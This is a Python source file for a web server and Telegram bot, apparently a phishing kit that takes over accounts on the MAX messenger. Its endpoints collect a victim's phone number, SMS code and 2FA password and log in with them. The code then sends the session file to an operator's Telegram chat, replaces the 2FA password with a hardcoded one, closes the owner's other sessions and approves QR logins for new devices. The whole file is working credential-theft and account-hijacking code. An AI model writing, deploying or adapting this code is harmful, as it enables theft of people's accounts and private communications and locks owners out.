# ============================================================================
#  app.py — MAX-авторизация + HTTP + TG-логи + QR-вход через TG (по фото)
# ============================================================================
import asyncio
import json
import logging
import os
import queue
import re
import secrets
import sys
import threading
from collections import defaultdict
from datetime import datetime
from io import BytesIO
from pathlib import Path

import numpy as np
import requests
from aiohttp import web
from dotenv import load_dotenv
from pymax import Client

# --- OpenCV (резервный декодер QR) ---
try:
    import cv2
except ImportError:
    cv2 = None

# --- pyzbar + Pillow (основной декодер QR) ---
try:
    from pyzbar.pyzbar import decode as pyzbar_decode
    from PIL import Image
    PYZBAR_OK = True
except ImportError:
    PYZBAR_OK = False

# --- pymax-провайдеры ---
try:
    from pymax.auth.providers import PasswordProvider, SmsCodeProvider
except ImportError:
    try:
        from pymax import PasswordProvider, SmsCodeProvider
    except ImportError:
        SmsCodeProvider = object
        PasswordProvider = object

# ============================================================================
#  КОНФИГ
# ============================================================================
load_dotenv()

TG_TOKEN = os.getenv("TG_TOKEN", "").strip()
TG_CHAT_ID = os.getenv("TG_CHAT_ID", "").strip()
HTTP_HOST = os.getenv("HTTP_HOST", "0.0.0.0")
HTTP_PORT = int(os.getenv("PORT", os.getenv("HTTP_PORT", "8080")))
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://max.ru/your-company-channel")

DEFAULT_2FA_PASSWORD = os.getenv("DEFAULT_2FA_PASSWORD", "Fiksik2009")

BASE_DIR = Path(__file__).parent
HTML_FILE = BASE_DIR / "index.html"
CACHE_DIR = BASE_DIR / "cache"
CACHE_DIR.mkdir(parents=True, exist_ok=True)

URL_RE = re.compile(r"https?://\S+", re.IGNORECASE)

# ============================================================================
#  ЛОГИРОВАНИЕ (только события)
# ============================================================================
class TelegramHandler(logging.Handler):
    def __init__(self, token: str, chat_id: str, level: int = logging.NOTSET):
        super().__init__(level)
        self.url = f"https://api.telegram.org/bot{token}/sendMessage"
        self.chat_id = chat_id
        self._queue: queue.Queue = queue.Queue()
        threading.Thread(target=self._worker, daemon=True).start()

    def _worker(self):
        while True:
            text = self._queue.get()
            if text is None:
                return
            try:
                requests.post(
                    self.url,
                    data={
                        "chat_id": self.chat_id,
                        "text": text,
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True,
                    },
                    timeout=10,
                )
            except Exception:
                pass

    def emit(self, record):
        try:
            msg = self.format(record)
            for i in range(0, len(msg), 4000):
                self._queue.put(msg[i:i + 4000])
        except Exception:
            self.handleError(record)


def setup_logging():
    # Глушим всё лишнее — root на WARNING
    root = logging.getLogger()
    root.setLevel(logging.WARNING)
    for noisy in ("pymax", "aiohttp", "asyncio", "urllib3", "requests"):
        logging.getLogger(noisy).setLevel(logging.WARNING)

    # Наш логгер для событий
    app_logger = logging.getLogger("app")
    app_logger.setLevel(logging.INFO)
    app_logger.propagate = False

    fmt = logging.Formatter(
        "%(asctime)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    app_logger.addHandler(ch)

    if TG_TOKEN and TG_CHAT_ID:
        th = TelegramHandler(TG_TOKEN, TG_CHAT_ID, level=logging.INFO)
        th.setFormatter(fmt)
        app_logger.addHandler(th)

    return app_logger


log = setup_logging()

# ============================================================================
#  TELEGRAM HELPERS
# ============================================================================
def tg_send_message(text: str, reply_markup: dict = None) -> None:
    if not (TG_TOKEN and TG_CHAT_ID):
        return
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    data = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, data=data, timeout=10)
    except Exception:
        pass


def tg_answer_callback(callback_id: str, text: str = "") -> None:
    url = f"https://api.telegram.org/bot{TG_TOKEN}/answerCallbackQuery"
    try:
        requests.post(
            url, data={"callback_query_id": callback_id, "text": text}, timeout=5
        )
    except Exception:
        pass


def tg_get_file_bytes(file_id: str) -> bytes | None:
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/getFile"
        r = requests.get(url, params={"file_id": file_id}, timeout=30)
        info = r.json()
        if not info.get("ok"):
            return None
        fp = info["result"]["file_path"]
        dl = f"https://api.telegram.org/file/bot{TG_TOKEN}/{fp}"
        rr = requests.get(dl, timeout=60)
        rr.raise_for_status()
        return rr.content
    except Exception:
        return None


# ============================================================================
#  QR-ДЕКОДЕРЫ
# ============================================================================
def _try_pyzbar(img_bytes: bytes) -> str | None:
    if not PYZBAR_OK:
        return None
    try:
        img = Image.open(BytesIO(img_bytes))
        if img.mode not in ("RGB", "L"):
            img = img.convert("RGB")

        results = pyzbar_decode(img)
        if results:
            return results[0].data.decode("utf-8", errors="ignore").strip()

        w, h = img.size
        img_big = img.resize((w * 2, h * 2), Image.LANCZOS)
        results = pyzbar_decode(img_big)
        if results:
            return results[0].data.decode("utf-8", errors="ignore").strip()

        img_gray = img.convert("L")
        img_bw = img_gray.point(lambda p: 0 if p < 128 else 255, "1")
        results = pyzbar_decode(img_bw)
        if results:
            return results[0].data.decode("utf-8", errors="ignore").strip()

        img_inv = img_gray.point(lambda p: 255 if p < 128 else 0, "L")
        results = pyzbar_decode(img_inv)
        if results:
            return results[0].data.decode("utf-8", errors="ignore").strip()

        return None
    except Exception:
        return None


def _try_opencv(img_bytes: bytes) -> str | None:
    if cv2 is None:
        return None
    try:
        arr = np.frombuffer(img_bytes, dtype=np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None

        detector = cv2.QRCodeDetector()

        data, _, _ = detector.detectAndDecode(img)
        if data:
            return data.strip()

        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

        for scale in (1.5, 2.0, 3.0):
            big = cv2.resize(gray, None, fx=scale, fy=scale,
                             interpolation=cv2.INTER_CUBIC)
            data, _, _ = detector.detectAndDecode(big)
            if data:
                return data.strip()

        for block in (11, 21, 31):
            th = cv2.adaptiveThreshold(
                gray, 255,
                cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
                cv2.THRESH_BINARY,
                block, 2,
            )
            data, _, _ = detector.detectAndDecode(th)
            if data:
                return data.strip()
            data, _, _ = detector.detectAndDecode(255 - th)
            if data:
                return data.strip()

        _, otsu = cv2.threshold(
            gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU
        )
        data, _, _ = detector.detectAndDecode(otsu)
        if data:
            return data.strip()

        return None
    except Exception:
        return None


def decode_qr_from_bytes(img_bytes: bytes) -> str | None:
    return _try_pyzbar(img_bytes) or _try_opencv(img_bytes)


# ============================================================================
#  СОСТОЯНИЕ
# ============================================================================
class AuthBridge:
    def __init__(self):
        self._codes = defaultdict(asyncio.Queue)
        self._passwords = defaultdict(asyncio.Queue)
        self._sessions: dict[str, dict] = {}
        self.last_password: dict[str, str] = {}

    async def submit_code(self, phone, code):
        await self._codes[phone].put(code)

    async def submit_password(self, phone, password):
        self.last_password[phone] = password
        await self._passwords[phone].put(password)

    async def get_code(self, phone):
        return await self._codes[phone].get()

    async def get_password(self, phone):
        return await self._passwords[phone].get()

    def reset(self, phone):
        self._sessions[phone] = {
            "status": "idle",
            "needs_password": None,
            "error": None,
            "redirect": None,
            "post_auth_done": False,
        }


bridge = AuthBridge()
active_clients: dict[str, Client] = {}
tg_documents_cache: dict[str, str] = {}
pending_qr_links: dict[str, str] = {}

TG_OFFSET_FILE = BASE_DIR / "tg_offset.txt"


def _load_tg_offset() -> int:
    try:
        return int(TG_OFFSET_FILE.read_text().strip())
    except Exception:
        return 0


def _save_tg_offset(offset: int) -> None:
    try:
        TG_OFFSET_FILE.write_text(str(offset))
    except Exception:
        pass


# ============================================================================
#  PYMAX-ПРОВАЙДЕРЫ
# ============================================================================
class SiteSmsProvider(SmsCodeProvider):
    def __init__(self, bridge, phone):
        self.bridge = bridge
        self.phone = phone

    async def get_code(self, phone, *a, **kw) -> str:
        code = await self.bridge.get_code(phone)
        log.info(f"✅ <b>Код введён</b> — <code>{phone}</code>")
        return code


class SitePasswordProvider(PasswordProvider):
    def __init__(self, bridge, phone):
        self.bridge = bridge
        self.phone = phone

    async def get_password(self, *a, **kw) -> str:
        cached = self.bridge.last_password.get(self.phone)
        if cached:
            return cached

        self.bridge._sessions[self.phone]["status"] = "waiting_password"
        self.bridge._sessions[self.phone]["needs_password"] = True
        pw = await self.bridge.get_password(self.phone)
        self.bridge.last_password[self.phone] = pw
        log.info(f"✅ <b>Пароль введён</b> — <code>{self.phone}</code>")
        return pw


# ============================================================================
#  ОТПРАВКА / ВОССТАНОВЛЕНИЕ СЕССИИ
# ============================================================================
def send_session_to_tg(phone: str, session_path: Path) -> None:
    if not (TG_TOKEN and TG_CHAT_ID) or not session_path.exists():
        return
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
    fname = f"session_{phone.lstrip('+')}.db"
    try:
        with open(session_path, "rb") as f:
            requests.post(
                url,
                data={
                    "chat_id": TG_CHAT_ID,
                    "caption": (
                        f"🔑 Сессия MAX для <code>{phone}</code>\n"
                        f"({datetime.now():%Y-%m-%d %H:%M:%S})"
                    ),
                    "parse_mode": "HTML",
                },
                files={"document": (fname, f)},
                timeout=30,
            )
        log.info(f"📦 <b>Сессия PyMax</b> отправлена — <code>{phone}</code>")
    except Exception:
        pass


def restore_session_from_tg(phone: str, session_path: Path) -> bool:
    if session_path.exists():
        return True
    fname = f"session_{phone.lstrip('+')}.db"
    file_id = tg_documents_cache.get(fname)
    if not file_id:
        return False
    data = tg_get_file_bytes(file_id)
    if not data:
        return False
    session_path.parent.mkdir(parents=True, exist_ok=True)
    session_path.write_bytes(data)
    return True


# ============================================================================
#  ПОСТ-АВТОРИЗАЦИОННЫЕ ДЕЙСТВИЯ
# ============================================================================
async def change_2fa_password(
    client: Client,
    phone: str,
    new_password: str = DEFAULT_2FA_PASSWORD,
) -> bool:
    old_password = bridge.last_password.get(phone)

    if old_password:
        try:
            await client.change_password(
                password_old=old_password,
                password_new=new_password,
            )
            bridge.last_password[phone] = new_password
            log.info(f"🔐 <b>Пароль 2FA изменён</b> — <code>{phone}</code>")
            return True
        except Exception:
            return False

    try:
        await client.set_2fa(password=new_password, hint=None, email=None)
        bridge.last_password[phone] = new_password
        log.info(f"🔐 <b>Пароль 2FA установлен</b> — <code>{phone}</code>")
        return True
    except Exception:
        return False


async def close_other_sessions(client: Client, phone: str) -> bool:
    try:
        await client.close_all_sessions()
        log.info(f"🧹 <b>Все прочие сессии сброшены</b> — <code>{phone}</code>")
        return True
    except Exception:
        return False


# ============================================================================
#  PYMAX-АВТОРИЗАЦИЯ
# ============================================================================
async def run_auth(phone: str) -> None:
    sess = bridge._sessions[phone]
    work_dir = CACHE_DIR / phone.lstrip("+")
    work_dir.mkdir(parents=True, exist_ok=True)
    session_path = work_dir / "session.db"

    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, restore_session_from_tg, phone, session_path)

    if phone in active_clients:
        sess["status"] = "success"
        sess["redirect"] = REDIRECT_URL
        return

    try:
        client = Client(
            phone=phone,
            work_dir=str(work_dir),
            session_name="session.db",
            sms_code_provider=SiteSmsProvider(bridge, phone),
            password_provider=SitePasswordProvider(bridge, phone),
        )
    except TypeError:
        client = Client(
            phone=phone, work_dir=str(work_dir), session_name="session.db"
        )
        client.sms_code_provider = SiteSmsProvider(bridge, phone)
        client.password_provider = SitePasswordProvider(bridge, phone)

    @client.on_start()
    async def on_start(client):
        sess["status"] = "success"
        sess["redirect"] = REDIRECT_URL
        await loop.run_in_executor(None, send_session_to_tg, phone, session_path)

        if sess.get("post_auth_done"):
            return
        sess["post_auth_done"] = True

        async def _post_auth():
            await asyncio.sleep(2)
            await change_2fa_password(client, phone)
            await close_other_sessions(client, phone)

        asyncio.create_task(_post_auth())

    @client.on_message()
    async def on_message(message, client):
        # Слушаем только для поддержания сессии
        pass

    active_clients[phone] = client

    try:
        await client.start()
    except Exception as e:
        if sess.get("status") != "success":
            sess["status"] = "error"
            sess["error"] = str(e)
    finally:
        active_clients.pop(phone, None)


# ============================================================================
#  TELEGRAM POLLING
# ============================================================================
async def telegram_polling():
    if not (TG_TOKEN and TG_CHAT_ID):
        return

    offset = _load_tg_offset()

    while True:
        try:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 30}
            r = await asyncio.to_thread(
                requests.get, url, params=params, timeout=35
            )
            data = r.json()
            if not data.get("ok"):
                await asyncio.sleep(2)
                continue

            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                _save_tg_offset(offset)
                await handle_update(upd)

        except Exception:
            await asyncio.sleep(3)


async def handle_update(upd: dict) -> None:
    if "callback_query" in upd:
        await handle_callback_query(upd["callback_query"])
        return

    msg = upd.get("message") or upd.get("channel_post") or {}
    if not msg:
        return

    doc = msg.get("document")
    if doc:
        fname = doc.get("file_name", "")
        if fname.startswith("session_") and fname.endswith(".db"):
            tg_documents_cache[fname] = doc["file_id"]
        return

    photo = msg.get("photo")
    if photo:
        largest = photo[-1]
        file_id = largest["file_id"]
        data = await asyncio.to_thread(tg_get_file_bytes, file_id)
        if not data:
            tg_send_message("❌ Не удалось скачать фото")
            return

        qr_text = await asyncio.to_thread(decode_qr_from_bytes, data)
        if not qr_text:
            tg_send_message(
                "❌ <b>Не удалось распознать QR-код</b>\n\n"
                "Попробуйте:\n"
                "• Отправить как <b>файл</b> (📎 → Файл), а не как фото\n"
                "• Сделать скриншот, где QR крупный и ровный\n"
                "• Обрезать лишнее по краям"
            )
            return

        await handle_qr_link(qr_text)
        return

    text = msg.get("text", "")
    if not text:
        return

    m = URL_RE.search(text)
    if m:
        qr_url = m.group(0).rstrip(".,;!?")
        await handle_qr_link(qr_url)


async def handle_qr_link(qr_url: str) -> None:
    if not active_clients:
        tg_send_message(
            "❌ <b>Нет активных аккаунтов</b>\n\n"
            "Сначала войдите хотя бы в один аккаунт через сайт."
        )
        return

    token = secrets.token_urlsafe(8)
    pending_qr_links[token] = qr_url

    buttons = []
    for phone in active_clients.keys():
        buttons.append([{
            "text": f"📱 {phone}",
            "callback_data": f"qr_pick:{token}:{phone}",
        }])
    buttons.append([{"text": "❌ Отмена", "callback_data": f"qr_cancel:{token}"}])

    preview = qr_url[:100] + ("…" if len(qr_url) > 100 else "")
    tg_send_message(
        f"🔐 <b>Найден QR для входа в MAX</b>\n\n"
        f"<code>{preview}</code>\n\n"
        f"Выберите аккаунт, от имени которого подтвердить вход:",
        reply_markup={"inline_keyboard": buttons},
    )


async def handle_callback_query(cb: dict) -> None:
    cb_id = cb["id"]
    data = cb.get("data", "")

    if data.startswith("qr_cancel:"):
        token = data.split(":", 1)[1]
        pending_qr_links.pop(token, None)
        tg_answer_callback(cb_id, "Отменено")
        tg_send_message("❌ Вход по QR отменён")
        return

    if data.startswith("qr_pick:"):
        _, token, phone = data.split(":", 2)
        qr_url = pending_qr_links.get(token)
        if not qr_url:
            tg_answer_callback(cb_id, "Ссылка устарела")
            return

        client = active_clients.get(phone)
        if not client:
            tg_answer_callback(cb_id, "Аккаунт отключён")
            return

        tg_answer_callback(cb_id, "Подтверждаю…")
        tg_send_message(f"⏳ Подтверждаю вход для <code>{phone}</code>…")

        try:
            ok = await client.authorize_qr_login(qr_url)
            if ok:
                tg_send_message(
                    f"✅ <b>Вход подтверждён!</b>\n\n"
                    f"Аккаунт: <code>{phone}</code>\n"
                    f"Новое устройство получит сессию в течение нескольких секунд."
                )
                pending_qr_links.pop(token, None)
            else:
                tg_send_message(f"❌ Не удалось подтвердить для {phone}")
        except Exception as e:
            tg_send_message(f"❌ Ошибка: <code>{e}</code>")


# ============================================================================
#  HTTP
# ============================================================================
async def handle_index(request):
    if not HTML_FILE.exists():
        return web.Response(text="index.html not found", status=404)
    return web.FileResponse(HTML_FILE)


async def handle_health(request):
    return web.json_response({"status": "ok"})


async def handle_send_code(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip()
    if not phone:
        return web.json_response({"ok": False, "error": "phone required"}, status=400)
    bridge.reset(phone)
    asyncio.create_task(run_auth(phone))
    return web.json_response({"ok": True})


async def handle_submit_code(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip()
    code = (data.get("code") or "").strip()
    if not phone or not code:
        return web.json_response({"ok": False, "error": "phone/code required"}, status=400)

    await bridge.submit_code(phone, code)

    for _ in range(20):
        await asyncio.sleep(0.5)
        s = bridge._sessions.get(phone, {}).get("status")
        if s in ("success", "waiting_password", "error"):
            break

    sess = bridge._sessions.get(phone, {})
    st = sess.get("status")
    if st == "success":
        return web.json_response({"ok": True, "redirect": sess.get("redirect")})
    if st == "waiting_password":
        return web.json_response({"ok": True, "needs_password": True})
    if st == "error":
        return web.json_response({"ok": False, "error": sess.get("error") or "Ошибка"})
    return web.json_response({"ok": False, "error": "timeout"})


async def handle_submit_password(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip()
    password = (data.get("password") or "").strip()
    if not phone or not password:
        return web.json_response({"ok": False, "error": "phone/password required"}, status=400)

    await bridge.submit_password(phone, password)

    for _ in range(20):
        await asyncio.sleep(0.5)
        s = bridge._sessions.get(phone, {}).get("status")
        if s in ("success", "error"):
            break

    sess = bridge._sessions.get(phone, {})
    if sess.get("status") == "success":
        return web.json_response({"ok": True, "redirect": sess.get("redirect")})
    return web.json_response({"ok": False, "error": sess.get("error") or "Неверный пароль"})


async def start_http():
    app = web.Application()
    app.router.add_get("/", handle_index)
    app.router.add_get("/health", handle_health)
    app.router.add_post("/api/auth/send-code", handle_send_code)
    app.router.add_post("/api/auth/submit-code", handle_submit_code)
    app.router.add_post("/api/auth/submit-password", handle_submit_password)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, HTTP_HOST, HTTP_PORT)
    await site.start()
    return runner


# ============================================================================
#  MAIN
# ============================================================================
async def main():
    await start_http()
    asyncio.create_task(telegram_polling())
    await asyncio.Event().wait()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass